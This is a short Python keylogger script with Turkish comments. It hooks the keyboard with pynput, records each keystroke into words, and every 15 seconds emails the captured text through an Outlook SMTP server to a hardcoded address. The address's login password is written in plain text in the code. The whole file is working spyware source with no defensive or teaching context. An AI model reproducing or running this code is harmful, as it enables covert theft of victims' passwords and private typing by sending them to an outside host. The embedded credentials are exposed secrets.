import threading
import pynput.keyboard
import smtplib
from email.mime.text import MIMEText

kelime = ""
toplam = []

def mail_gonderici(mesaj):
    global toplam
    try:
        # SMTP server bağlantısı ve email gönderimi
        server = smtplib.SMTP("smtp-mail.outlook.com", 587, timeout=30)
        server.starttls()
        server.login("alsancaksiber@gmail.com", "the.lord01")  # Şifrenizin doğru olduğundan emin olun

        # MIMEText mesaj formatı
        msg = MIMEText(mesaj)
        msg["Subject"] = "Klavye Girdisi"
        msg["From"] = "alsancaksiber@gmail.com"
        msg["To"] = "alsancaksiber@gmail.com"

        # E-posta gönderme
        server.sendmail("alsancaksiber@gmail.com", "alsancaksiber@gmail.com", msg.as_string())
        server.quit()
    except Exception as e:
        print(f"Mail gönderirken hata oluştu: {e}")


def dallanma():
    global toplam
    if toplam:
        mail_gonderici(" ".join(toplam))  # Toplamdaki kelimeleri birleştirip mesaj olarak gönder
        toplam = []  # Listeyi sıfırlıyoruz
    timer = threading.Timer(15, dallanma)
    timer.start()


def yazdir(tus):
    global kelime
    try:
        if hasattr(tus, 'char') and tus.char:  # Normal karakterler
            kelime += tus.char
        elif tus == pynput.keyboard.Key.space:  # Boşluk tuşu
            kelime += " "
        elif tus == pynput.keyboard.Key.backspace:  # Geri silme
            kelime = kelime[:-1] if kelime else kelime
        elif tus == pynput.keyboard.Key.enter:  # Enter tuşu
            print(kelime)
            toplam.append(kelime)  # Kelimeyi listeye ekle
            kelime = ""
        elif hasattr(tus, "vk"):  # Özel tuşlar
            kelime += f"<{tus.vk}>"
        else:
            print(f"Tanınmayan tuş: {tus}")
    except AttributeError:
        pass


# Klavye dinleyici başlatılıyor
with pynput.keyboard.Listener(on_press=yazdir) as dinle:
    dallanma()
    dinle.join()
